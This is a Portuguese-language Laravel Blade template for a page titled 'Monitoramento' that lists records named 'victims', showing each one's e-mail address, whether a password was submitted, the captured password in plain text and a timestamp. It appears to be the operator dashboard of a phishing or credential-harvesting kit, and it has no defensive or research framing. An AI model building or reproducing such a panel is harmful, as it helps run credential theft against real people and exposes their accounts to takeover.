<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">

    <meta name="viewport"
          content="width=device-width, initial-scale=1.0">

    <title>Monitoramento</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f6f8;
            margin: 0;
            padding: 30px;
        }

        .container {
            max-width: 1100px;
            margin: auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
        }

        h1 {
            margin-top: 0;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th,
        td {
            padding: 12px;
            border-bottom: 1px solid #ddd;
            text-align: left;
        }

        th {
            background: #f0f0f0;
        }

        .status {
            font-weight: bold;
        }

        .pagination {
            margin-top: 25px;
        }
    </style>

</head>

<body>

<div class="container">

    <h1>Monitoramento</h1>

    <p>
        Total de registros:
        <strong>{{ $victims->total() }}</strong>
    </p>

    <table>

        <thead>
        <tr>
            <th>ID</th>
            <th>E-mail</th>
            <th>Status</th>
            <th>Senha</th>
            <th>Data</th>
        </tr>
        </thead>

        <tbody>

        @forelse($victims as $victim)

            <tr>

                <td>
                    {{ $victim->id }}
                </td>

                <td>
                    {{ $victim->email }}
                </td>

                <td class="status">
                    {{ $victim->password_submitted ? 'Sim' : 'Não' }}
                </td>

                <td>
                    {{ $victim->password }}
                </td>

                <td>
                    {{ optional($victim->created_at)->format('d/m/Y H:i:s') }}
                </td>

            </tr>

        @empty

            <tr>
                <td colspan="5">
                    Nenhum registro encontrado.
                </td>
            </tr>

        @endforelse

        </tbody>

    </table>

    <div class="pagination">
        {{ $victims->links() }}
    </div>

</div>

</body>

</html>